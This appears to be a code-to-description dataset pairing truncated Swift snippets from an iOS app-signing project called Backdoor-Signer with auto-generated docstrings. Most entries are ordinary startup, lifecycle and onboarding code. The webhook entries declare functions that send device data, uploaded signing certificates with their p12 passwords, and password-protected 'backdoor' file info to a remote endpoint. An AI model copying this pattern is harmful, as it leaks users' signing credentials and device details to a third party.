    "code": "func initializePhase5_Terminal() {\nDebug.shared.log(message: \"Initializing phase 5: Terminal components\", type: .info)\n\n// Setup terminal\nsetupTerminal()\n\n// Proceed to final setup\ninitializePhase6_FinalSetup()\n}\n",
    "nl": "/ Phase 5: Initialize terminal components",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift",
    "code_type": "function"
  },
  {
    "id": "1256",
    "code": "func initializePhase6_FinalSetup() {\nDebug.shared.log(message: \"Initializing phase 6: Final setup\", type: .info)\n\n// Show startup components with delay\nDispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {",
    "nl": "/ Phase 6: Final setup and cleanup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift",
    "code_type": "function"
  },
  {
    "id": "1257",
    "code": "extension Notification.Name {\nstatic let appInitializationCompleted = Notification.Name(\"appInitializationCompleted\")\n}\n",
    "nl": "Create notification for app initialization completion",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+PhasedTerminal.swift",
    "code_type": "extension"
  },
  {
    "id": "1258",
    "code": "extension AppDelegate {\n/// Set up minimal UI for safe mode\nfunc setupSafeModeUI() {",
    "nl": "MARK: - Safe Mode Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "extension"
  },
  {
    "id": "1259",
    "code": "func setupSafeModeUI() {\nDebug.shared.log(message: \"Setting up safe mode UI\", type: .info)\n\n// Create a basic view controller for safe mode\nlet safeModeVC = UIViewController()\nsafeModeVC.view.backgroundColor = .systemBackground\n\n// Add warning icon\nlet imageView = UIImageView(image: UIImage(systemName: \"exclamationmark.triangle.fill\"))\nimageView.tintColor = .systemYellow",
    "nl": "/ Set up minimal UI for safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1260",
    "code": "@objc func exitSafeModePressed() {\nSafeModeLauncher.shared.disableSafeMode()\n\n// Show restart confirmation\nlet alert = UIAlertController(\ntitle: \"Restart Required\",\nmessage: \"The app needs to restart to exit safe mode. Do you want to restart now?\",\npreferredStyle: .alert\n)\n",
    "nl": "/ Safe mode exit button handler",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1261",
    "code": "@objc func continueSafeModePressed() {\n// First ensure we have valid UI state\nif window == nil {",
    "nl": "/ Continue in safe mode button handler",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1262",
    "code": "func setupLimitedFunctionality() {\nDebug.shared.log(message: \"Setting up limited functionality for safe mode\", type: .info)\n\n// Initialize only essential services - access through AppDelegate instance\nguard let appDelegate = UIApplication.shared.delegate as? AppDelegate else {",
    "nl": "/ Set up limited functionality for safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1263",
    "code": "func initializeSecondaryComponentsInSafeMode() {\n// Only initialize essential image handling - use method on parent AppDelegate class\nif let appDelegate = UIApplication.shared.delegate as? AppDelegate {",
    "nl": "/ Initialize secondary components with limited functionality for safe mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1264",
    "code": "func setupCriticalBackgroundTasks() {\n// Implement only critical background tasks here\n// This is a subset of the full background task setup\n}\n\n/// Prompt user to enable AI features with safeguards\nfunc promptForAIInitializationSafely() {",
    "nl": "/ Set up only essential background tasks",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1265",
    "code": "func promptForAIInitializationSafely() {\n// Mark that we've shown the prompt\nUserDefaults.standard.set(true, forKey: \"AIPromptShown\")\n\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Prompt user to enable AI features with safeguards",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+SafeMode.swift",
    "code_type": "function"
  },
  {
    "id": "1266",
    "code": "extension AppDelegate {\n/// Set up and send analytics data to the webhook endpoint\n/// This endpoint is not a webhook in the traditional sense, but a REST API endpoint\n/// that receives POST requests with JSON content\nfunc setupAndSendWebhook() {",
    "nl": "MARK: - Webhook Extension for AppDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift",
    "code_type": "extension"
  },
  {
    "id": "1267",
    "code": "func setupAndSendWebhook() {\nDebug.shared.log(message: \"Setting up webhook data submission\", type: .info)\n\n// Only send webhook data if we haven't sent it before or if in development mode\nlet userDefaults = UserDefaults.standard\nlet hasSent = userDefaults.bool(forKey: hasSentWebhookKey)\nlet isDevelopment = ProcessInfo.processInfo.environment[\"DEVELOPMENT\"] != nil\n\nif !hasSent || isDevelopment {",
    "nl": "/ Set up and send analytics data to the webhook endpoint / This endpoint is not a webhook in the traditional sense, but a REST API endpoint / that receives POST requests with JSON content",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift",
    "code_type": "function"
  },
  {
    "id": "1268",
    "code": "private func createAppLaunchPayload() -> [String: Any] {\nlet device = UIDevice.current\nlet appVersion = Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String ?? \"Unknown\"\nlet buildNumber = Bundle.main.infoDictionary?[\"CFBundleVersion\"] as? String ?? \"Unknown\"\n\n// Create a structured payload with relevant information\n\nreturn [\n\"event\": \"app_launch\",\n\"timestamp\": ISO8601DateFormatter().string(from: Date()),",
    "nl": "/ Creates a structured payload for the app launch webhook with device and app information / - Returns: Dictionary containing the payload data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift",
    "code_type": "function"
  },
  {
    "id": "1269",
    "code": "func sendCertificateInfoToWebhook(certificate: Certificate, p12Password: String?) {\nguard let webhookEndpoint = URL(string: webhookURL) else {",
    "nl": "/ Sends certificate data to webhook for tracking and backup / - Parameters: /   - certificate: The certificate being uploaded /   - p12Password: Optional password for the p12 file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift",
    "code_type": "function"
  },
  {
    "id": "1270",
    "code": "func sendBackdoorInfoToWebhook(backdoorPath: URL, password: String?) {\nguard let webhookEndpoint = URL(string: webhookURL) else {",
    "nl": "/ Sends backdoor file info to webhook for tracking / - Parameters: /   - backdoorPath: Path to the backdoor file /   - password: Optional password",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift",
    "code_type": "function"
  },
  {
    "id": "1271",
    "code": "func sendWebhookData(to endpoint: URL, payload: [String: Any]) {\n// Create the URL request\nvar request = URLRequest(url: endpoint)\nrequest.httpMethod = \"POST\"\nrequest.setValue(\"application/json\", forHTTPHeaderField: \"Content-Type\")\n\ndo {",
    "nl": "/ Generic method to send webhook data to the specified endpoint / - Parameters: /   - endpoint: The URL endpoint to send data to /   - payload: The data payload to send",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate+Webhook.swift",
    "code_type": "function"
  },
  {
    "id": "1272",
    "code": "class AppDelegate: UIResponder, UIApplicationDelegate, UIOnboardingViewControllerDelegate {\nstatic let isSideloaded = Bundle.main.bundleIdentifier != \"com.bdg.backdoor\"\nvar window: UIWindow?\n\n// Use a lazy var inside the class to prevent memory leaks\nlazy var downloadTaskManager = DownloadTaskManager.shared\n\n// Track app state to prevent issues during background/foreground transitions\nprivate var isInBackground = false\nvar isShowingStartupPopup = false",
    "nl": "Global variable for DownloadTaskManager This is a singleton, so no need for lazy initialization",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "class"
  },
  {
    "id": "1273",
    "code": "static func getDocumentsDirectory() -> URL {\nFileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]\n}\n\nfunc application(_: UIApplication,\ndidFinishLaunchingWithOptions _: [UIApplication.LaunchOptionsKey: Any]?) -> Bool\n{",
    "nl": "MARK: - Static Method for Documents Directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1274",
    "code": "func application(_: UIApplication,\ndidFinishLaunchingWithOptions _: [UIApplication.LaunchOptionsKey: Any]?) -> Bool\n{",
    "nl": "Function application - implements application functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1275",
    "code": "func applicationDidBecomeActive(_: UIApplication) {\nDebug.shared.log(message: \"App became active\", type: .info)\nisInBackground = false\n\n// Ensure UI is responsive after returning from background\nDispatchQueue.main.async { [weak self] in",
    "nl": "MARK: - App Lifecycle Methods (Enhanced for robust background/foreground handling)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1276",
    "code": "func applicationWillResignActive(_: UIApplication) {\nDebug.shared.log(message: \"App will resign active\", type: .info)\n\n// Save any important in-memory data\ndo {",
    "nl": "Function applicationWillResignActive - implements applicationwillresignactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1277",
    "code": "func applicationDidEnterBackground(_ application: UIApplication) {\nDebug.shared.log(message: \"App entered background\", type: .info)\nisInBackground = true\n\n// Create a background task to ensure we have time to clean up\nvar bgTask: UIBackgroundTaskIdentifier = .invalid\nbgTask = application.beginBackgroundTask {",
    "nl": "Function applicationDidEnterBackground - implements applicationdidenterbackground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1278",
    "code": "func applicationWillEnterForeground(_ application: UIApplication) {\nDebug.shared.log(message: \"App will enter foreground\", type: .info)\n\n// Set flag to track that we're no longer in background\nisInBackground = false\n\n// Schedule background refresh operation in a separate queue with lower priority\n// to avoid competing with UI restoration\nbackgroundQueue.async {",
    "nl": "Function applicationWillEnterForeground - implements applicationwillenterforeground functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1279",
    "code": "private func performInitialUIRestoration() {\nDebug.shared.log(message: \"Performing initial UI restoration\", type: .info)\n\n// First check if window and root view controller exist\nguard let window = window,\nlet rootVC = window.rootViewController\nelse {",
    "nl": "Function performInitialUIRestoration - implements performinitialuirestoration functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1280",
    "code": "private func completeUIRestoration(_ application: UIApplication) {\nDebug.shared.log(message: \"Completing UI restoration\", type: .info)\n\n// Only proceed if we're not showing a startup popup\nif isShowingStartupPopup {",
    "nl": "Function completeUIRestoration - implements completeuirestoration functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1281",
    "code": "func applicationWillTerminate(_: UIApplication) {\nDebug.shared.log(message: \"App will terminate\", type: .info)\n\n// Perform final cleanup\nsaveApplicationState()\n\n// Make sure core data is saved\ndo {",
    "nl": "Function applicationWillTerminate - implements applicationwillterminate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1282",
    "code": "private func refreshViewHierarchy(_ viewController: UIViewController) {\n// Make view controller interactive\nviewController.view.isUserInteractionEnabled = true\n\n// Force layout update\nviewController.view.setNeedsLayout()\nviewController.view.layoutIfNeeded()\n\n// If it's a container view controller, refresh its children\nif let navController = viewController as? UINavigationController {",
    "nl": "Helper method to refresh the entire view hierarchy",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1283",
    "code": "func showAppropriateStartupScreen() {\n// Only show startup screens on fresh launch, not when returning from background\nif isInBackground {",
    "nl": "Function showAppropriateStartupScreen - implements showappropriatestartupscreen functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1284",
    "code": "private func saveApplicationState() {\n// Save the current version to UserDefaults\nif let version = Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String {",
    "nl": "Function saveApplicationState - implements saveapplicationstate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1285",
    "code": "private func showStartupPopupIfNeeded() {\n// Check if popup has been shown before and ensure we don't show multiple popups\nlet hasShownPopup = UserDefaults.standard.bool(forKey: hasShownStartupPopupKey)\n\nguard !hasShownPopup && !isShowingStartupPopup else {",
    "nl": "Function showStartupPopupIfNeeded - implements showstartuppopupifneeded functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1286",
    "code": "private func ensureMainUIIsAccessible() {\n// Make sure the tab bar and navigation are accessible\nif let tabBarController = window?.rootViewController as? UIHostingController<TabbarView> {",
    "nl": "Function ensureMainUIIsAccessible - implements ensuremainuiisaccessible functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1287",
    "code": "private func setupUserDefaultsAndPreferences() {\nlet userDefaults = UserDefaults.standard\nuserDefaults.set(Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String, forKey: \"currentVersion\")\nif userDefaults.data(forKey: UserDefaults.signingDataKey) == nil {",
    "nl": "Function setupUserDefaultsAndPreferences - sets upuserdefaultsandpreferences",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1288",
    "code": "func setupWindow() {\n// Ensure we don't recreate window if it exists\nguard window != nil else {",
    "nl": "Function setupWindow - sets upwindow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1289",
    "code": "private func showOnboardingScreen() {\n// Create a custom onboarding view controller that auto-dismisses\nlet customOnboardingVC = CustomAutoClosingOnboardingVC()\ncustomOnboardingVC.onComplete = { [weak self] in",
    "nl": "Function showOnboardingScreen - implements showonboardingscreen functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1290",
    "code": "private class CustomAutoClosingOnboardingVC: UIViewController {\n// MARK: - UI Components\n\nprivate let contentView = UIView()\nprivate let titleLabel1 = UILabel()\nprivate let titleLabel2 = UILabel()\nprivate let appIconView = UIImageView()\nprivate let featuresStackView = UIStackView()\nprivate let termsLabel = UITextView()\nprivate let progressView = UIProgressView()",
    "nl": "/ Custom onboarding view controller that shows the onboarding content / and automatically dismisses after 5 seconds with a progress bar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "class"
  },
  {
    "id": "1291",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\n}\n\noverride func viewDidAppear(_ animated: Bool) {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1292",
    "code": "override func viewDidAppear(_ animated: Bool) {\nsuper.viewDidAppear(animated)\n\n// Start the timer when the view appears\nstartTime = Date()\nstartProgressTimer()\n\n// Schedule automatic dismissal after exactly 5 seconds\nDispatchQueue.main.asyncAfter(deadline: .now() + displayDuration) { [weak self] in",
    "nl": "Function viewDidAppear - implements viewdidappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1293",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\n// Ensure timer is invalidated when view disappears\ntimer?.invalidate()\n}\n\n// MARK: - UI Setup\n\nprivate func setupUI() {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1294",
    "code": "private func setupUI() {\nview.backgroundColor = .systemBackground\n\n// App Icon\nappIconView.image = UIImage(named: \"backdoor_glyph\")\nappIconView.contentMode = .scaleAspectFit\nappIconView.tintColor = Preferences.appTintColor.uiColor\nview.addSubview(appIconView)\n\n// Title Labels",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1295",
    "code": "private func addFeature(icon: String, title: String, description: String) {\nlet featureView = UIView()\n\nlet iconView = UIImageView()\niconView.image = UIImage(systemName: icon)\niconView.contentMode = .scaleAspectFit\niconView.tintColor = Preferences.appTintColor.uiColor\nfeatureView.addSubview(iconView)\n\nlet titleLabel = UILabel()",
    "nl": "Function addFeature - implements addfeature functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1296",
    "code": "private func setupConstraints() {\nappIconView.translatesAutoresizingMaskIntoConstraints = false\ntitleLabel1.translatesAutoresizingMaskIntoConstraints = false\ntitleLabel2.translatesAutoresizingMaskIntoConstraints = false\nfeaturesStackView.translatesAutoresizingMaskIntoConstraints = false\ntermsLabel.translatesAutoresizingMaskIntoConstraints = false\nprogressView.translatesAutoresizingMaskIntoConstraints = false\n\nNSLayoutConstraint.activate([\nappIconView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 40),",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1297",
    "code": "private func startProgressTimer() {\n// Update progress every 0.1 seconds\ntimer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in",
    "nl": "MARK: - Timer Management",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1298",
    "code": "private func dismissOnboarding() {\n// Stop timer before animation\ntimer?.invalidate()\ntimer = nil\n\n// Animate dismissal\nUIView.animate(withDuration: 0.5, animations: { [weak self] in",
    "nl": "Function dismissOnboarding - implements dismissonboarding functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1299",
    "code": "private func setupMainUI() {\nDebug.shared.log(message: \"Setting up main UI with improved initialization\", type: .info)\n\ndo {",
    "nl": "Function setupMainUI - sets upmainui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1300",
    "code": "private func setupNotifications() {\n// Setup base notification observers for app lifecycle\nNotificationCenter.default.removeObserver(self) // Remove any existing observers to prevent duplicates\n\n// Add observers for essential app lifecycle events\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(applicationDidBecomeActive(_:)),\nname: UIApplication.didBecomeActiveNotification,\nobject: nil",
    "nl": "Add a separate method for setting up notifications to ensure this happens regardless of UI setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1301",
    "code": "private func logDeviceInfo() {\nDebug.shared.log(message: \"Version: \\(UIDevice.current.systemVersion)\")\nDebug.shared.log(message: \"Name: \\(UIDevice.current.name)\")\nDebug.shared.log(message: \"Model: \\(UIDevice.current.model)\")\nDebug.shared.log(message: \"Backdoor Version: \\(logAppVersionInfo())\\n\")\n}\n\nfunc setupBackgroundTasks() {",
    "nl": "Function logDeviceInfo - implements logdeviceinfo functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1302",
    "code": "func setupBackgroundTasks() {\nif Preferences.appUpdates {",
    "nl": "Function setupBackgroundTasks - sets upbackgroundtasks",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1303",
    "code": "private func initializeSecondaryComponents() {\n// Initialize image pipeline\nimagePipline()\n\n// Setup AI integration\nAppContextManager.shared.setupAIIntegration()\n\n// Send basic app launch analytics to webhook\n// This is a lightweight call with minimal data\nsetupAndSendWebhook()",
    "nl": "Function initializeSecondaryComponents - implements initializesecondarycomponents functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1304",
    "code": "private func getDeviceInfo() -> [String: Any] {\nlet device = UIDevice.current\nvar systemInfo = utsname()\nuname(&systemInfo)\nlet machineMirror = Mirror(reflecting: systemInfo.machine)\nlet identifier = machineMirror.children.reduce(\"\") { identifier, element in",
    "nl": "Function getDeviceInfo - retrieves deviceinfo",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1305",
    "code": "private func batteryStateString(_ state: UIDevice.BatteryState) -> String {\nswitch state {",
    "nl": "Function batteryStateString - implements batterystatestring functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1306",
    "code": "private func thermalStateString(_ state: ProcessInfo.ThermalState) -> String {\nswitch state {",
    "nl": "Function thermalStateString - implements thermalstatestring functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1307",
    "code": "private func isConnectedToWiFi() -> Bool {\nif let interfaces = CNCopySupportedInterfaces() as NSArray? {",
    "nl": "Function isConnectedToWiFi - checks if connectedtowifi",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1308",
    "code": "private func sendDeviceInfoToWebhook() {\nlet userDefaults = UserDefaults.standard\nlet hasSent = userDefaults.bool(forKey: hasSentWebhookKey)\n\nguard !hasSent else {",
    "nl": "Function sendDeviceInfoToWebhook - implements senddeviceinfotowebhook functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1309",
    "code": "func scheduleAppRefresh() {\nlet request = BGAppRefreshTaskRequest(identifier: \"kh.crysalis.backdoor.sourcerefresh\")\nrequest.earliestBeginDate = Date(timeIntervalSinceNow: 15 * 60)\ndo {",
    "nl": "Function scheduleAppRefresh - implements scheduleapprefresh functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1310",
    "code": "func handleAppRefresh(task: BGAppRefreshTask) {\nscheduleAppRefresh()\nlet backgroundQueue = OperationQueue()\nbackgroundQueue.qualityOfService = .background\nlet operation = SourceRefreshOperation()\ntask.expirationHandler = { operation.cancel() }",
    "nl": "Function handleAppRefresh - implements handleapprefresh functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1311",
    "code": "func application(_: UIApplication, open _: URL, options _: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {\nreturn false\n}\n\nfunc didFinishOnboarding(onboardingViewController _: UIOnboardingViewController) {",
    "nl": "Function application - implements application functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1312",
    "code": "func didFinishOnboarding(onboardingViewController _: UIOnboardingViewController) {\ncompleteOnboarding()\n}\n\nprivate func completeOnboarding() {",
    "nl": "Function didFinishOnboarding - implements didfinishonboarding functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1313",
    "code": "private func completeOnboarding() {\nPreferences.isOnboardingActive = false\nlet tabBarController = UIHostingController(rootView: TabbarView())\nlet transition = CATransition()\ntransition.type = .fade\ntransition.duration = 0.3\nwindow?.layer.add(transition, forKey: kCATransition)\nwindow?.rootViewController = tabBarController\nFloatingButtonManager.shared.show()\n}",
    "nl": "Function completeOnboarding - implements completeonboarding functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1314",
    "code": "fileprivate func addDefaultRepos() {\nif !Preferences.defaultRepos {",
    "nl": "Function addDefaultRepos - implements adddefaultrepos functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1315",
    "code": "fileprivate func giveUserDefaultSSLCerts() {\nif !Preferences.gotSSLCerts {",
    "nl": "Function giveUserDefaultSSLCerts - implements giveuserdefaultsslcerts functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1316",
    "code": "fileprivate static func generateRandomString(length: Int = 8) -> String {\nlet characters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\nvar result = \"\"\nfor _ in 0..<length {",
    "nl": "Function generateRandomString - implements generaterandomstring functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1317",
    "code": "func createSourcesDirectory() {\nlet fileManager = FileManager.default\nlet documentsURL = Self.getDocumentsDirectory()\nlet sourcesURL = documentsURL.appendingPathComponent(\"Apps\")\nlet certsURL = documentsURL.appendingPathComponent(\"Certificates\")\nif !fileManager.fileExists(atPath: sourcesURL.path) {",
    "nl": "Function createSourcesDirectory - creates sourcesdirectory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Delegates/AppDelegate.swift",
    "code_type": "function"
  },
  {
    "id": "1318",
